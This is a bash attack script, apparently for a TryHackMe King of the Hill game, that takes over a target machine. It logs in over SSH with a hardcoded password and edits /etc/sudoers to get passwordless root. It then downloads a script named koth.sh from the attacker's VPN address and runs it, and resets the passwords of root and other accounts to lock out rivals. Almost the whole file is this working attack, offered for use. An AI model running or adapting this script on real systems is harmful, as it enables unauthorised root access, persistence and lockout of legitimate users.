#!/bin/bash

# Created by @H3X-007 :)

# https://github.com/H3X-007/KOTH

missing() {
  if ! command -v "$1" >/dev/null 2>&1; then
    echo "Install '$1' before running $0 script."
    exit 1
  fi
}

missing sshpass 

while getopts ":i:u:p:" opt; do
  case $opt in
    i) IP="$OPTARG" ;;
    u) username="$OPTARG" ;;
    p) new_password="$OPTARG" ;;
  esac
done

if [ -z "$IP" ] || [ -z "$username" ] || [ -z "$new_password" ]; then
  echo "Usage: $0 -i 'The machine IP' -u 'Your username on thm' -p 'The new password'"
  exit 1
fi

bobba_password='-`G)8(t/NDkZ"u^{'

vpn=$(ip a show dev tun0 | awk '/inet / {print $2}' | cut -d'/' -f1)

sshpass -p "$bobba_password" ssh -o StrictHostKeyChecking=no bobba@"$IP" /bin/bash <<EOF
  find /etc/sudoers -exec sed -i '/^#includedir \/etc\/sudoers.d/a bobba ALL=(ALL) NOPASSWD: /bin/su' {} \;
  sleep 1
  sudo su
  echo "$username" >> /root/king.txt
  cd /boot && wget http://$vpn/koth.sh && chmod +x koth.sh && ./koth.sh "$vpn" "$username"
  echo "root:$new_password" | sudo chpasswd
  echo "bobba:$new_password" | sudo chpasswd
  echo "duku:$new_password" | sudo chpasswd
  echo "yoda:$new_password" | sudo chpasswd
EOF
